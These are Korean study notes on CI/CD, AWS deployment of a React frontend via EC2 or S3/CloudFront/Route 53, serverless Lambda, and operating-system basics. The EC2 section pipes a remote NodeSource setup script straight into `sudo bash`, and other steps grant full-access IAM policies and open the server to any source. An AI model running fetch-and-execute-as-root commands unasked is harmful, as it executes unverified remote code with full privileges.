- CI/CD (지속적 통합/지속적 배포)

  1. CI(Continuous Integration)

  여러 개발자가 작성한 코드를 주기적으로 통합하는 과정을 말한다. 코드가 레포지토리에 병합되기 전에 자동으로 빌드하고 테스트해서 문제를 조기에 발견하고 해결할 수 있도록 돕는다.
  즉 CI는 빌드, 테스트 자동화를 담당한다. (예: `PR 올림 → 자동 빌드 + 테스트 (CI)`, `PR 머지 → 프로덕션 배포 전 다시 빌드 + 테스트 (CI)`)

  2. CD(Continuous Delivery/Continuous Deployment)

  CI가 성공적으로 끝난 코드를 사용자에게 서비스 가능한 환경까지 자동으로 배포하는 과정이다. 즉 CI/CD 방식에서 CD의 역할은 배포 자동화이다. CD를 수행하기 전 코드의 테스트, 빌드,
  통합은 필수이므로 CI가 항상 선행되어야 한다. CI를 성공적으로 마친 후 테스트 서버와 운영 서버에 곧바로 배포되는 환경을 CD라고 한다. (`예: PR 머지 후 빌드 테스트 통과 시 → 자동 배포 진행 (CD)`)

  3. CI/CD

  CI/CD는 개발부터 빌드, 테스트, 통합, 배포까지의 전 과정을 자동화하는 방식입니다. 이를 활용하면 개발 효율성이 높아지고 코드 품질 유지와 빠른 출시가 가능하다.

- CI/CD 파이프라인

  CI/CD의 여러 단계를 순차적으로 연결한 프로세스 구조이다. 주요 단계는 빌드(컴파일), 테스트(오류 및 호환성 검사), 릴리즈(버전 관리 저장소에 반영), 배포(프로덕션 환경 적용), 규정 준수 및 유효성 검사 등이 포함된다.

- 클라우드 서비스(클라우드 컴퓨팅)란?

  클라우드 서비스란 클라우드 컴퓨팅 기술을 사용하여 제공하는 서비스를 말한다. 클라우드 컴퓨팅 기술이란 인터넷을 통한 구독 기반의 기술로 서버, 스토리지, 소프트웨어 등
  필요한 IT 자원을 자신의 컴퓨터가 아닌 클라우드에 연결된 다른 컴퓨터에서 제공해주는 기술을 의미한다.

- 클라우드 서비스 사용 이유

  1. 시간 절약 : 직접 서버나 인프라를 구축하지 않아도 되어 초기 비용과 출시 시간을 크게 단축할 수 있다.

  2. 유연한 대응 : 서비스 수요에 따라 자원을 쉽게 늘리거나 줄일 수 있어 갑작스런 트래픽 증가에도 빠르게 대응할 수 있다.

  3. 비용 절약 : 사용한 만큼만 비용을 지불하는 구조(Pay-as-you-go)로 불필요한 자원 낭비를 줄일 수 있다.

- AWS 관련 용어

  1. EC2 (Elastic Compute Cloud)

  AWS에서 제공하는 가상 서버 서비스로, 물리적 서버를 임대하듯 독립된 서버 환경을 사용할 수 있다. EC2 인스턴스란 이 가상 서버 한 대를 의미하며,
  다양한 사양을 선택할 수 있다. AWS가 제공하는 URL(Public DNS)를 통해 인터넷에서 접근 가능하다.

  2. Secuirty Group

  EC2 인스턴스에 대한 네트워크 접근을 제어하는 가상 방화벽입니다. HTTP, SSH 등의 포트를 열어줘야 외부에서 접속할 수 있습니다.

  3. RDS(Relational Database Service)

  AWS가 관리하는 관계형 데이터베이스 서비스로, 사용자가 직접 설치 및 운영할 필요 없이 쉽게 데이터베이스를 운용할 수 있고 비용도 된다.

  4. ELB(Elastic Load Balancing)

  여러 대의 서버에 트래픽을 분산시켜주는 로드 밸런서 서비스이다. 서버 상태를 실시간으로 모니터링하여 정상적인 서버로만 요청을 분배한다.

  5. Route 53

  AWS의 DNS(도메인 네임 시스템) 서비스로 도메인 등록, 트래픽 라우팅, 상태 확인 등을 제공한다.

  6. CloudFront

  AWS의 CDN(콘텐츠 전송 네트워크) 서비스로, 전 세계 엣지 서버에서 사용자에게 데이터를 빠르게 전송한다. HTTPS 리다이렉션 같은 보안 기능도 제공한다.

  7. S3(Simple Storage Service)

  AWS의 객체 스토리지 서비스로, 파일을 저장하고 인터넷에 공개하거나 비공개로 관리할 수 있다. 웹사이트 이미지, 백업 등 다양한 용도로 사용된다. (ex 파일 서버)

  8. PM2 (Process Manager 2)

  Node.js 애플리케이션을 관리하는 프로세스 매니저이다. 무중단 배포, 클러스터 모드 실행 등을 지원해 애플리케이션 안정성과 성능을 높인다.

  9. 젠킨스(Jenkins)

  오픈소스 CI 도구로, 자동 빌드/테스트/배포 파이프라인을 구성하여 여러 개발자가 협업할 때 통합을 쉽게 해준다.

  10. IAM(Identity and Access Management)

  AWS 자원에 대한 사용자별 접근 권한을 관리하는 서비스이다. 루트 계정 외에 여러 사용자/그룹별 권한을 설정할 수 있다.

  11. VPC(Virtual Private Cloud)

  사용자가 직접 정의하는 가상 네트워크로, AWS 내에서 격리된 네트워크 환경을 만들어 보안과 네트워크 설정을 맞춤형으로 구성할 수 있다.

  12. WAF (Web Application Firewall)

  웹 애플리케이션에 대한 비정상적이고 악의적인 트래픽을 탐지, 차단하는 방화벽이다.

- AWS S3, AWS EC2, AWS Amplify를 활용한 각 프론트 배포 방법 차이

  - AWS EC2

    웹 서버 및 애플리케이션 서버를 직접 구축하고 운영해야 한다. 비용과 관리 부담이 크지만, 서버 측 렌더링(SSR) 프로젝트에 적합하며, 높은 제어권을 제공한다.

  - AWS S3

    정적 웹사이트 호스팅에 최적화된 서비스로, 별도의 서버 구축 없이 빌드 결과물(HTML, CSS, JS 등)을 저장하고 배포한다. CloudFront CDN과 함께 사용해 빠르고 안정적인 콘텐츠 전달이 가능하다. SSR 지원은 별도 서버리스 함수나 백엔드가 필요하다.

  - AWS Amplify

    S3와 CloudFront 기반 정적 웹사이트 및 SSR을 포함한 애플리케이션 배포를 자동화하는 서비스다. 빌드, 배포, 호스팅, 백엔드 서비스 통합 관리가 가능해 편리하다.

  - 정리

    1. Nginx : 웹 서버로 정적 콘텐츠 및 리버스 프록시 역할

    2. AWS EC2 : 서버 운영 및 SSR 가능

    3. AWS S3 + Cloudfront : 정적 콘텐츠 빠른 배포 및 캐싱

    4. AWS Amplify : S3 + CloudFront + CI/CD 자동화 + SSR 일부 지원

<br>

- 배포 방법 (EC2)

  (1) EC2 인스턴스를 생성 : 로그인 -> EC2 대시보드로 이동 -> 인스턴스 시작 버튼 클릭 -> EC2에서 사용할 OS머신 선택 -> CPU, 메모리 등 서버의 규모 선택 -> EC2 인스턴스 구성 설정 (서브넷, 퍼블릭 IP 자동 할당, 셧다운 시 OS 종료 방식, 종료 방지 기능 등) -> 스토리지 추가 -> 태그 추가 (EC2 리소스 태그, IAM 정책 권한 등) -> 보안 그룹 설정 단계에서 HTTP, HTTPS 접속을 허용하기 위해 규칙 추가 후 포트 범위를 8000, 소스를 위치무관으로 하여 규칙을 추가한다. -> 태그 추가 시 생성한 키페어를 선택하여 인스턴스 시작 버튼 클릭하여 인스턴스 생성, 인스턴스 상태가 러닝으로 바뀌게 되면 실제 서버가 동작하게 된다. -> 태그 추가 시 생성한 키벨류 페어가 파일로 생성되는데 aws 디렉토리에서 확인할 수 있다. 파일명은 키, 확장자는 pem으로 생성되는데 터미널에서 접근하여 chmod 400 으로 모드를 바꿔주어 ssh 접속을 할 수 있도록 한다. (chmod 400 yujaemin.pem) -> EC2 인스턴스에 접속하기 위해 터미널에 `ssh -i yujaemin.pem ubuntu@3.21.33.191` 와 같이 입력한다. 이 때 우분투 뒤 아이피는 EC2 공인아이피를 적어주어야한다. 아마존 사이트에서 인스턴스 목록 중 시작한 인스턴스를 선택하면 IPv4 퍼블릭 IP를 확인할 수 있다.

  (2) 프론트엔드 배포(우분투 환경) : 터미널에서 ssh 접속을 허용하기 위해 `chmod 400 key이름.pem` 으로 권한 설정 -> 터미널에서 EC2 서버에 접속 `ssh -i key이름.pem ubuntu@1.23.45.678` 이 때 우분투 뒤 아이피는 EC2 공인아이피를 적어주어야한다. 아마존 사이트에서 인스턴스 목록 중 시작한 인스턴스를 선택하면 IPv4 퍼블릭 IP를 확인할 수 있다. -> 터미널에서 git clone으로 소스코드 받아오기 -> 노드js 설치를 위해 터미널에서 `curl -sL https://deb.nodesource.com/setup_14.x | sudo bash -` 실행 후 `sudo apt-get install nodejs` 실행 후 node -v 와 npm -v로 설치 확인 -> 터미널에서 clone한 프로젝트 디렉토리로 이동 후 npm i로 필요한 패키지 설치 -> `npm run build` 하여 배포환경에서 사용 할 파일 생성 (압축 형태 파일) -> 프로젝트 루트 디렉토리에서 `npm i express --save` node express 설치 -> 프로젝트 루트 디렉토리에서 express와 연동을 위해 `vi server.js`로 파일을 생성한다. 그 후 server.js에서 소스 코드(아래 참고)를 추가하여 express와 연결한다. 이 때 포트번호는 EC2 인스턴스 생성 시 사용했던 포트번호로 지정해야한다. -> `node server.js`로 서버 실행 -> 우분투 뒤 아이피 값과 포트번호로 접속하여 잘 동작하는지 확인한다. (ex `1.23.45.678:8080`) -> 터미널 종료 시에도 서버가 돌아가게 하기 위한 설정을 해야한다. 터미널에서 프로젝트 루트 디렉토리로 이동 후 `sudo node server.js &`로 서버를 실행하면 서버가 유지된다. 이렇게 하면 배포가 완료된 것이다.

  ```js
  // server.js
  const http = require("http");
  const express = require("express");
  const path = require("path");

  const app = express();

  const port = 8000;

  app.get("/ping", (req, res) => {
    res.send("pong");
  });

  app.use(express.static(path.join(__dirname, "build")));

  app.get("/*", (req, res) => {
    res.set({
      "Cache-Control": "no-cache, no-store, must-revalidate",
      Pragma: "no-cache",
      Date: Date.now(),
    });
    res.sendFile(path.join(__dirname, "build", "index.html"));
  });

  http.createServer(app).listen(port, () => {
    console.log(`app listening at ${port}`);
  });
  ```

<br>

- 배포 방법 (S3, cloudfront, Route 53, IAM, CI/CD, 참고 : https://42place.innovationacademy.kr/archives/9784)

  (0) 도메인 만들기 : 무료 도메인 발급을 위해 Freenom 접속 -> Servieces 탭 -> Register a New Domain -> 원하는 도메인 checkout 후 도메인 상태가 active가 되면 사용 가능하다.

  (1) IAM 권한 설정 : AWS 사이트에서 IAM 대시보드 -> 사용자 추가 버튼 -> 1단계에서 사용자 이름 입력, 액세스 유형은 액세스 키 선택 ->
  2단계에서 기존 정책 직접 연결 탭에서 AmazonS3FullAccess 를 체크, CloudFront 진행을 위해 CloudFrontFullAccess 도 선택 ->
  끝 단계까지 넘어간 후 사용자 만들기 클릭하여 액세스 키 발급, csv다운로드 버튼을 클릭하여 액세스 키 csv파일 저장

  (2) S3 버킷 만들기 : AWS 사이트에서 S3 대시보드 -> 버킷 만들기 버튼 -> 일반구성 탭에서 버킷 이름 입력, AWS 리전 선택 (기본값으로 설정되어 나옴) ->
  객체 소유권 탭에서 ACL 활성화를 선택 -> 이 버킷의 퍼블릭 액세스 차단 설정 탭에서 퍼블릭 액세스를 차단하면 웹으로 접근이 불가능하기 때문에 차단을 풀어주고 아래 유의사항 체크박스에 체크하여 확인 -> 그 외의 항목들은 기본 값으로 두거나 상황에 맞게 설정, 버킷 만들기 버튼 눌러서 버킷 생성 -> 버킷 목록에서 생성한 버킷 선택 -> 속성 탭 선택 후 맨 아래 정적 웹 사이트 호스팅 편집 -> 정적 웹사이트 호스팅 활성화, 인덱스 문서와 오류 문서 index.html로 변경 후 변경사항 저장 -> 해당 버킷의 권한 탭 선택 -> 버킷 정책 탭에서 편집 -> 정책 생성기 클릭 -> Effect는 Allow (유저가 접속할 수 있도록 설정), Select Type of Policy는 S3 Bucket Policy, Principal는 `/*`입력 (모든 유저에 대해서 라는 뜻), Action은 GetObject (유저들이 이 버킷에 접근할 수 있는 권한을 준다는 뜻), ARN은 버킷 정책 편집 페이지에 적혀있는 ARN을 입력하는데 끝에 `/*` 를 추가 (`/*`은 모든 오브젝트에 대해서라는 뜻이며 작성 예시는 `arn:aws:s3:::버킷이름/*`)까지 입력 후 Add Statement 를 클릭하면 리스트가 생성 됨 -> Generate Policy 를 클릭하면 JSON 형태의 문서가 나오는데 전체 복사 -> 다시 버킷 정책 편집 탭으로 들어와 복사한 값을 붙여넣기 후 변경 사항 저장 버튼 클릭하여 저장

  (3) 빌드된 프로젝트 S3 버킷에 업로드(CLI를 통한 업로드) : AWS CLI 설치(https://docs.aws.amazon.com/ko_kr/cli/latest/userguide/getting-started-install.html) -> 설치 완료 후 터미널에서 유저 추가 `aws configure --profile [유저명]` (IAM 에서 생성한 사용자 이름을 입력) -> IAM권한설정에서 다운받은 csv 파일을 확인하여 AWS Access Key ID, AWS Secret Access Key, fault region name, Default output format 입력 -> 터미널에서 배포할 프로젝트 디렉토리로 이동하여 명령어를 입력 `aws s3 sync ./build s3://[S3 버킷 이름] --profile=[사용자 아이디]` (예 `aws s3 sync ./build s3://woalsqjzlt --profile=yujaemin`), package.json script에 deploy로 추가해두면 편하게 실행할 수 있다.

  (4) Route 53 도메인 설정 : AWS 사이트에서 Route53 대시보드 -> 호스팅 영역 -> 호스팅 영역 생성 버튼 클릭 -> 도메인 이름 탭에서 설정할 도메인 주소 입력 -> 유형 탭에서 퍼블릭 호스팅 영역 체크 -> 호스팅 영역 생성 버튼 클릭 -> 네임 서버 리스트 값들이 생성되는데 도메인 서버의 레코드 관리 페이지에 입력해주어야한다. -> Freenom 의 경우 Servieces 탭 -> My Domains -> ManageDomain 클릭 -> Management Tools -> Nameservers를 선택 -> Use custom nameservers 체크 -> 발급받은 Nameserver 적은 후 체인지 네임서버 버튼 선택

  (5) CloudFront 배포 생성 : AWS 사이트에서 CloudFront 대시보드 -> CloudFront 배포 생성 버튼 클릭 -> 원본 도메인 탭에서 인풋 박스 클릭 후 생성한 S3 버킷 선택 -> S3버킷 액세스 탭에서 OAI 사용 체크 후 새 OAI를 생성 (이미 가지고 있으면 기존 ID선택, 자동으로 입력된 값 사용) -> 뷰어 프로토콜 정책 탭에서 Redirect HTTP to HTTPS 선택 (HTTP접속을 HTTPS로 리다이렉트 시킴) ->
  Route53으로 커스텀 도메인을 설정한 경우 대체 도메인 이름 탭에서 Route53으로 생성한 주소 입력 -> 대체 도메인 입력 시 HTTPS를 사용할 것이기 때문에 SSL 인증서가 필요하다. 인증서는 AWS Certificate Manager를 통해 발급 (https://console.aws.amazon.com/acm/home?region=us-east-1#/certificates/request) -> 모든 설정 후 배포 생성, 생성하면 state가 in progress라고 뜨는데 조금 기다리면 완료 됨.

  (6) CloudFront 주소와 Route53으로 생성한 도메인 연결 : AWS 사이트에서 Route53 대시보드 -> 호스팅한 도메인에 레코드 생성 버튼 클릭 -> 라우팅 정책 선택 탭에서 단순 라우팅 선택 -> 레코드 구성 탭에서 단순 레코드 정의 클릭 -> 단순 레코드 정의 탭에서 레코드 유형은 A, 값/트래픽 라우팅 대상은 CloudFront 배포에 대한 별칭, 배포 선택에서는 우리가 생성한 CloudFront 를 선택 후 단순 레코드 정의 버튼 클릭하여 레코드를 생성을 완료하면 연결된다.

  (7) 캐시 무효화(Invalidation) 하기 : 캐시 무효화하는 이유는 프로젝트 업데이트를 위해서이다. S3에 파일을 업로드하면 CloudFront의 엣지 로케이션에 캐싱되어 저장된다. 파일의 캐시 만료 전 프로젝트가 업데이트 되어 갱신하기 위해서는 S3에 업데이트된 파일을 새로 업로드하고 CloudFront가 가지고 있는 캐시를 비워야한다. 그렇게 되면 사용자가 파일 요청 시 엣지 로케이션이 캐시를 가지고 있지 않기 때문에 S3에 새로 요청하여 내용을 업데이트 시킬 수 있다. ->
  AWS 사이트에서 IAM 대시보드 -> 권한 추가 버튼 클릭 -> CloudFrontFullAccess 선택하여 추가 -> 터미널에 `aws cloudfront create-invalidation --profil=[사용자 아이디] --distribution-id [CloudFront ID] --paths /*` 입력, distribution-id 는 CloudFront 페이지에서 ID 값을 입력해주면 된다. paths 는 invalidation 할 파일들을 지정하는 것인데, 전체를 업데이트 해야할 경우 /\* 을 입력, 이 명령어 또한 package.json에 script로 추가하여 사용하면 편하다. ->
  프로젝트 루트 디렉토리에 .env 환경 변수 파일 생성 후 해당 명령 입력 `PUBLIC_URL="https://[S3 버킷 이름].s3.[리전].amazonaws.com/"` 만약 Route53으로 커스텀 도메인을 생성한 경우에는 해당 도메인 주소를 PUBLIC_URL 에 입력 (예 https://www.jaemin.com/)

  (8) react-router-dom 사용 시 페이지 이동 후 403 에러 발생 대응 : AWS 사이트에서 S3 버킷 설정으로 이동하여 인덱스 문서, 오류 문서를 index.html로 설정 -> CloudFront 설정 페이지로 이동 후 오류 페이지 탭 클릭 -> 사용자 정의 오류 생성 버튼 클릭하여 오류코드 403, 404 생성하고 응답 페이지 경로를 index.html로 설정 후 응답코드를 200으로 설정

<br>

### # Presigned URL

- Presigned URL

  Presigned URL은 AWS S3 객체에 대해 별도의 권한 없이도 특정 작업(GET, PUT 등)을 한정된 시간 동안 허용하는 미리 서명된 임시 URL입니다. Presigned URL을 생성하기 위한
  createPresignedPost 메소드를 활용할 수 있다.

- 동작 방식

  1. 사용자가 클라이언트에서 업로드할 파일 이름 등 메타데이터를 서버에 요청한다.

  2. 서버는 AWS SDK를 통해 Presigned URL을 생성하여 클라이언트에 응답한다.

  3. 클라이언트는 이 Presigned URL을 이용해 직접 S3에 PUT 요청으로 파일을 업로드한다.

  4. 업로드가 완료되면, 클라이언트는 해당 파일의 S3 URL 또는 파일 경로를 서버에 전달하여 저장하거나 추후 사용한다.

<br>

### # 서버리스 아키텍처

- 서버리스 아키텍처란?

  서버리스는 ‘서버가 없다’는 뜻이 아니라, 개발자가 서버 인프라를 직접 관리하지 않아도 되는 아키텍처를 의미

- 기존 서비스 모델과 클라우드 서비스 모델 비교

  | 구분                               | 설명                                                                                                             | 예시                             |
  | ---------------------------------- | ---------------------------------------------------------------------------------------------------------------- | -------------------------------- |
  | 자체 시스템 관리 (온프레미스)      | 하드웨어부터 네트워크, OS, 서버, 애플리케이션까지 모두 직접 구축 및 운영                                         | 자체 데이터센터                  |
  | IaaS (Infrastructure as a Service) | 가상 서버, 스토리지, 네트워크 등 인프라를 클라우드로 제공. 서버 OS 설치 및 애플리케이션 배포 등은 직접 관리 필요 | AWS EC2, Microsoft Azure VM      |
  | PaaS (Platform as a Service)       | 인프라 + 런타임 환경 제공. 애플리케이션 개발과 배포에 집중할 수 있으며 자동 확장과 로드 밸런싱 기능 지원         | Heroku, AWS Elastic Beanstalk    |
  | SaaS (Software as a Service)       | 완성된 소프트웨어를 인터넷으로 제공. 사용자는 설치 없이 웹에서 바로 사용 가능                                    | Gmail, Google Workspace, Dropbox |

- 서버리스 컴퓨팅 서비스 종류

  - BaaS (Backend as a Service)

    - 미리 구축된 백엔드 기능(API, 인증, 데이터베이스, 파일 저장 등)을 서비스 형태로 제공

    - 개발자가 직접 서버 코드를 작성하지 않아도 기능을 쉽게 사용할 수 있음

    - 사용량 기반 과금

    - 예시: Firebase, AWS Cognito, Auth0

  - FaaS (Function as a Service)

    - 코드를 함수 단위로 작성해 클라우드에서 이벤트 기반으로 실행하는 컴퓨팅 서비스

    - 서버 프로비저닝, 관리 불필요

    - 함수가 호출되면 클라우드 환경에서 실행 후 종료, 사용한 만큼 비용 지불

    - 특징:

      - 무상태(stateless)로 설계해야 함 (함수 간 상태 공유 불가, 로컬 스토리지 등 로컬 데이터 사용 불가)

      - 콜드 스타트 문제 존재 (처음 호출 시 실행 지연)

      - 자원의 제한, 실행 시간 및 메모리 제한 존재 (예: AWS Lambda는 최대 15분, 메모리 최대 10GB 등)

    - 용도 예시: API 백엔드, 이미지 리사이징, 데이터 처리, 자동화 작업 등

    - 예시: AWS Lambda, Azure Functions, Google Cloud Functions

- AWS Lambda 이미지 리사이징 예시 (nodejs)

  ```js
  // sharp 모듈을 불러옴 - 이미지 변환을 위해 사용
  const sharp = require("sharp");

  // aws-sdk 모듈을 불러옴 - AWS 서비스 접근을 위해 사용
  const aws = require("aws-sdk");

  // S3 서비스 객체 생성
  const s3 = new aws.S3();

  // 변환 옵션 배열 - 각 옵션에는 이름과 리사이즈할 폭(width)이 정의되어 있음
  const tansformationOptions = [
    { name: "w140", width: 140 },
    { name: "w600", width: 600 },
  ];

  // Lambda 함수 핸들러 정의 - S3 이벤트를 처리함
  exports.handler = async (event) => {
    try {
      // 이벤트에서 S3 객체 키를 추출
      const Key = event.Records[0].s3.object.key;

      // 키에서 파일 이름만 추출
      const keyOnly = Key.split("/")[1];
      console.log(`Image Resizing: ${keyOnly}`);

      // S3에서 이미지를 읽어들이기 위한 스트림 생성
      const imageStream = s3
        .getObject({ Bucket: "na0man-image-upload-tutorial", Key })
        .createReadStream();

      // 변환 옵션 배열을 순회하며 각 옵션에 대해 비동기적으로 처리
      await Promise.all(
        tansformationOptions.map(async ({ name, width }) => {
          // 새로운 키(경로) 생성
          const newKey = `${name}/${keyOnly}`;

          // sharp 변환기 생성 - 이미지를 회전하고 크기를 조정
          const transformer = sharp()
            .rotate()
            .resize({ width, height: width, fit: "outside" });

          // 이미지 스트림을 변환기에 파이핑하여 리사이즈된 이미지 버퍼를 생성
          const resizedImageBuffer = await new Promise((resolve, reject) => {
            const chunks = [];
            imageStream
              .pipe(transformer)
              .on("data", (chunk) => chunks.push(chunk)) // 데이터를 청크 단위로 수집
              .on("end", () => resolve(Buffer.concat(chunks))) // 모든 데이터가 수집되면 버퍼로 결합
              .on("error", reject); // 오류 발생 시 reject 호출
          });

          // 리사이즈된 이미지를 S3 버킷에 저장
          await s3
            .putObject({
              Bucket: "na0man-image-upload-tutorial",
              Body: resizedImageBuffer,
              Key: newKey,
            })
            .promise();
        })
      );

      // 모든 작업이 성공하면 상태 코드 200과 함께 이벤트 데이터를 반환
      return {
        statusCode: 200,
        body: JSON.stringify(event),
      };
    } catch (err) {
      // 오류가 발생하면 콘솔에 로그를 남기고 상태 코드 500과 함께 이벤트 데이터를 반환
      console.error(err);
      return {
        statusCode: 500,
        body: JSON.stringify(event),
      };
    }
  };
  ```

<br><br><br>

## # Operating System

<br>

### # 리눅스 쉘 명령어

- man : 다양한 리눅스 명령어의 사용법을 알 수 있다.

- mkdir : 디렉토리 생성

- ls : 현재 폴더 안에 있는 파일과 폴더 목록 출력

- pwd : 현재 작업 중인 디렉토리의 절대 경로 출력

- cd : 디렉토리 이동

- echo : 텍스트나 변수 값을 출력

- sudo : 다른 사용자의 권한을 얻거나 관리자(root) 권한으로 명령 실행할 떄 사용

- cp : 디렉토리/파일 복사

- mv : 디렉토리/파일 경로 이동 및 이름 수정

- clear : 터미널 깨끗하게 정리

- cat : 텍스트 출력, 여러 파일을 붙혀서 실행 가능

- history : 쉘에서 실행한 명령어 이력

- find : 특정 조건에 맞는 파일/디렉토리 검색

- ps : 현재 실행 중인 프로세스 목록 및 상태 출력

- curl : 웹서버에 HTTP 요청을 보낼 수 있는 도구로, API 호출 등 다양하게 사용 (Client URL)

- grep : 정규표현식 사용으로 파일 내에 특정 문자열 찾은 후 출력

- chmod : 디렉토리/파일 권한 변경

- nohup : 터미널 종료 후에도 계속 백그라운드에서 작업 유지

<br>

### # 비트, 바이트

- 비트(bit)

  정보의 최소 단위로, 0 아니면 1 중 하나의 값을 가지는 아주 작은 데이터 조각이다. 0또는 1이 하나의 비트가 된다. 컴퓨터는 0 또는 1의 나열로 일을 처리하는데 결국 비트열(비트의 나열)로 모든 것을 표현하게 되는 것이다. 비트가 바이너리 코드를 구성하는 조각임. (ex 1010이라는 4자리 이진수(바이너리 코드)는 4개의 비트로 구성된 것)

- 바이트(byte)

  컴퓨터는 일반적으로 8bit를 하나의 단위로 묶어 사용하는데 이것이 바이트이다. 바이너리 코드의 작은 한 조각이다.

- 32비트와 64비트 차이

  - CPU가 정보를 처리하는 최소 단위를 레지스터라고 하며 레지스터는 CPU 내부의 메모리이다. 레지스터는 명령어 해석이나 연산시에 사용되는 데이터를 순간적으로 저장한다.

  - 32비트와 64비트는 CPU 내부 레지스터가 한 번에 처리할 수 있는 데이터 크기를 의미

  - 처리량의 한계치가 단순히 두 배가 차이나는 것이 아닌 32비트는 2의 32제곱이고, 64는 2의 64제곱이므로 차이가 크다.

<br>

### # Parsor

- 파싱(Parsing)

  - 구문 분석이라고도 하며 문서나 문장을 구성 요소로 분해하고 그 요소들 간의 위계 관계를 분석해 문장의 구조를 결정하는 과정

  - 브라우저 렌더링 엔진에서 HTML 파서가 HTML 문서를 파싱하여 DOM 트리를 형성하는 것이 대표적인 예시다.

- 파서(Parser)

  - 파싱 작업을 수행하는 프로그램 또는 컴파일러의 한 구성 요소

  - 입력된 텍스트나 코드의 문법적 구조를 분석해 의미 있는 구조(예: 트리 형태)를 만들어 내는 역할을 한다.

<br>

### # 커넥션 풀(Connection Pool)

- 커넥션 풀(Connection Pool)이란?

  데이터베이스와 미리 연결된 커넥션 객체들을 일정 개수만큼 만들어 풀(pool)에 저장해둔다. 클라이언트 요청 시 이 커넥션 객체를 빌려주고, 작업이 끝나면 다시 반납받아 재사용하는 방식이다.

- 커넥션 풀을 사용하는 이유 및 장점

  1. 빠른 접속 : 매번 새로 연결하는 오버헤드 없이 기존 커넥션을 재사용해 속도가 빠르다.

  2. 서버 자원 관리 : 최대 연결 수를 제한해 DB 서버 과부하를 방지한다.

  3. 유지 보수 편리 : DB 접속 관련 코드를 모듈화해 관리가 쉽고 DB 환경 변경 시 일괄 대응이 가능하다.

  4. 비용 절감 : 새로운 연결 생성과 종료에 드는 비용과 시간을 절약한다.

<br>

### # 프로세스, 스레드

- 프로그램

  특정 작업을 실행하기 위한 규칙 또는 순서를 나타내는 명령어들의 모음이다. 아직 실행되지는 않았지만, 실행 가능한 상태의 정적인 존재이다. (ex chrome.exe, node, 카카오톡 설치 파일)

- 프로세스

  프로그램이 운영체제(OS)에 의해 메모리 공간(코드,데이터,스택,힙)을 할당받아 실행 중인 상태로 실행 중인 프로그램을 말한다. (ex 지금 열려 있는 크롬 창, 카카오톡 창 등)

  - 프로세스 종료 후

    - 메모리: OS가 회수

    - 파일 디스크립터(열린 파일/소켓): 자동으로 닫힘

    - 자식 프로세스: 부모 프로세스가 죽으면 고아가 되거나 강제 종료될 수 있음

  - 프로세스 예시

    예시 1. 우리가 VS Code나 Chrome을 켜고 끄는 것도 내부적으로는 프로세스 생성 → 종료의 반복이다.

    예시 2. nodejs 코드 실행 시 별개의 프로세스가 생성되고 코드 실행 종료 후 프로세스가 종료된다.

    예시 3. 프로세스 = 하나의 “앱 실행 인스턴스”, 켜면 자원 할당 받고 작업 끝나면 창 닫히고 자원 회수됨

- 스레드

  프로세스 안에서 실제 일을 하는 작업 단위이다. 모든 프로세스에는 한 개 이상의 스레드가 존재하며 프로세스 자원을 공유한다. (ex 크롬에서 탭마다 쓰는 백그라운드 작업 등)

- 인스턴스

  실제 돌아가는 앱/객체/프로세스

<br>

### # 싱글스레드(Single Thread)언어, 멀티스레드(Multi Thread) 언어 차이

- 싱글 스레드

  - 개념

    - 하나의 프로세스가 하나의 스레드만을 사용해 작업을 처리하는 방식이다.

    - 스레드 하나가 순차적으로 명령을 실행하며, 자원 동기화가 필요 없다.

    - 대표적인 싱글 스레드 언어는 자바스크립트이다.

  - 장점

    1. 동기화 문제 없음: 여러 스레드 간 자원 공유가 없어 동기화 이슈가 없다.

    2. 문맥 전환 없음: 스레드 전환이 없으므로 문맥 교환 비용이 없다.

    3. 프로그래밍 난이도 낮음: 구조가 단순해 코딩과 디버깅이 쉽습니다.

  - 단점

    1. CPU 활용 제한: 한 코어만 사용하므로 멀티코어 CPU를 제대로 활용하지 못한다.

    2. 동기적 실행: 작업이 순차적으로 처리되어 느릴 수 있다.

    3. 에러에 취약: 스레드 하나에 에러가 발생하면 전체 프로세스가 멈출 위험이 있다.

- 멀티 스레드

  - 개념

    - 하나의 프로세스 내에서 여러 스레드가 병렬 또는 동시 작업을 수행하는 방식이다.

    - 각 스레드는 독립된 레지스터와 스택을 가지며, 힙 메모리는 공유한다.

    - 스레드 간 전환(문맥 전환)은 빠르지만 비용이 발생한다.

  - 장점

    - 높은 응답성: 한 스레드가 지연되거나 중단되어도 다른 스레드가 작업을 이어간다.

    - 효율적인 자원 사용: 메모리와 자원을 공유해 효율적이다.

    - 병렬/비동기 처리 가능: 작업을 동시에 수행할 수 있어 처리 속도가 향상된다.

  - 단점

    - 문맥 전환 비용: 스레드 전환에 따른 오버헤드가 발생할 수 있다.

    - 동기화 문제: 공유 자원에 대한 동기화 필요성 때문에 개발 난이도가 높고 버그 위험이 있다. 공유하는 변수나 자료구조에 여러 스레드가 동시 접근 시 예상치 못한 값을 수정하거나 가져올 수 있기 때문에 동기화가 필요하다. 즉, 스레드 스케쥴링을 신경써야 함

    - 프로그래밍 난이도 상승: 동시성 문제를 관리해야 하므로 복잡하다.

- 싱글 스레드 Vs 멀티 스레드 차이

  | 항목                       | 싱글 스레드                          | 멀티 스레드                          |
  | -------------------------- | ------------------------------------ | ------------------------------------ |
  | 스레드 수                  | 1                                    | 2개 이상                             |
  | 에러 시 프로세스 중단 여부 | 에러 발생 시 전체 프로세스 중단 가능 | 한 스레드 에러 시 다른 스레드로 극복 |
  | 문맥 전환 여부             | 없음                                 | 있음                                 |
  | 작업 실행 방식             | 동기적                               | 병렬/비동기적                        |
  | 프로그래밍 난이도          | 쉬움                                 | 어려움                               |
  | CPU 자원 활용              | 한 코어만 사용                       | 멀티 코어 활용 가능                  |
  | 자원 소모                  | 상대적으로 적음                      | 상대적으로 많음                      |
  | 동기화 처리 필요성         | 없음                                 | 있음                                 |
  | 스레드 스케줄링 신경쓰기   | 필요 없음                            | 필요                                 |

<br>

### # 문맥 전환(Context Switching)

- 문맥 전환(Context Switching)

  운영체제에서 문맥 전환(context switching)은 CPU가 한 프로세스(또는 스레드)의 실행을 멈추고, 다른 프로세스를 실행하기 위해 현재 상태(문맥)를 저장하고 새로운 상태로 전환하는 과정을 말한다.
  이때 저장되는 문맥 정보는 CPU 레지스터, 프로그램 카운터(PC), 스택 포인터(SP) 등이며, 주로 PCB(Process Control Block) 또는 TCB(Thread Control Block)에 저장되어 된다.
  문맥 전환은 운영체제가 멀티태스킹을 지원하기 위해 필수적인 작업이며, 스케줄러에 의해 수행된다.

- 특징

  - 문맥 전환은 오버헤드가 발생한다. (저장/복원 시간, CPU 캐시 무효화 등)

